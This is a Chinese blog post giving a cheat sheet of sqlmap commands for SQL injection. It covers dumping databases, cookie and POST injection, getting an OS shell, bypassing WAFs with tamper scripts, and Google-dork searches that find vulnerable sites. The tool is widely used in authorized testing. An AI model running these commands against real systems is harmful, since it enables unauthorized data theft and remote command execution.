---
layout: post
title: "sqlmap simple useage"
date: <2017-05-18 15:41:20>
tags: sqlmap
description: sqlmap most simple usage
share: 
---

# SQLMAP实战操作：
1. ACCESS数据库：

``` shell
sqlmap.py -u “url” /*-u为常规扫描参数*/
sqlmap.py -u “url” –tables /*–tables拆数据库表*/
sqlmap.py -u “url” –columns -T “要拆的表名”/*列出指定表名*/
sqlmap.py -u “url” –dump -T “要拆的表名”-C “要拆的字段名” /*–dump为拆解字段名会保存在sqlmap/output目录下*/
```

2. MYSQL数据库：

``` shell
sqlmap.py -u “url” /*扫描注入点*/
sqlmap.py -u “url” –dbs /*列出所有数据库*/
sqlmap.py -u “url” –current-db /*列出当前数据库*/
sqlmap.py -u “url” –current-user /*列出当前用户*/
sqlmap.py -u “url” –tables -D “当前数据库名” /*拆解当前数据库表*/
sqlmap.py -u “url” –columns -T “要拆得的表名” -D “当前数据库名” /*拆解指定表字段名*/
sqlmap.py -u “url” –dump -C “字段名” -T “表名” -D “当前数据库”
```

3. SQLSERVER数据库：

``` shell
sqlmap.py -u “url” /*扫描注入点*/
sqlmap.py -u “url” –dbs /*列出所有数据库*/
sqlmap.py -u “url” –current-db /*列出当前数据库*/
sqlmap.py -u “url” –current-user /*列出当前用户*/
sqlmap.py -u “url” –tables -D “当前数据库名” /*拆解当前数据库表*/
sqlmap.py -u “url” –columns -T “要拆得的表名” -D “当前数据库名” /*拆解指定表字段名*/
sqlmap.py -u “url” –dump -C “字段名” -T “表名” -D “当前数据库”
SQLSERVER操作和MYSQL是一样的！！！常见的几种数据库！！！
```

4. COOKIE注入：

``` shell
sqlmap.py -u “www.xxx.com/asp或者www.xxx.com/php” –cookie “参数名如id=1” –level 2/*level为提升权限*/
什么数据库就按照上面的数据库加上cookie语句拆解就行了
```

5. POST注入：

_抓包保存到SQLMAP目录下.txt的文件然后输入指令sqlmap.py -r xxx.txt /*xxx.txt为保存包文件的文件名”_

``` shell
sqlmap.py -u “url” –data “POST参数”
```

6. 执行shell命令：

``` shell
sqlmap.py -u “url” –os-cmd=”net user” /*执行net user命令*/
sqlmap.py -u “url” –os-shell /*系统交互的shell*/
```

7. 注入HTTP请求 :

``` shell
sqlmap.py -r xxx.txt –dbs /*xxx.txt内容为HTTP请求*/
```

8. 绕过WAF的tamper插件使用：

``` shell
sqlmap.py -u “url” –tamper “xxx.py”
sqlmap.py -u “url” –tamper=”xxx.py”
```

>关于tamper脚本详细说明在本博客中有，链接为：http://www.matsec.cn/?id=5
9. 将注入语句插入到指定位置：

``` shell
sqlmap.py -u “url(www.xxx.com/id/1*.html)” –dbs
```

>Note 
{: .note}

有些网站是采用伪静态的页面使用SQLMAP的普通注入是不行的，所以SQLMAP提供了”*”参数将SQL语句插入指定位置，一般用于伪静态注入。
在使用HTTP注入时使用-r参数也可以直接在文本中添加*号

10. 延时注入：

``` shell
sqlmap –dbs -u “url” –delay 0.5 /*延时0.5秒*/
sqlmap –dbs -u “url” –safe-freq /*请求2次*/
```

11. 使用谷歌语法搜索注入(Google hack)：

``` shell
sqlmap.py -g “inurl:asp?id=1” /*””内为搜索语法，如：inurl,intitle,site,filetype等等
```
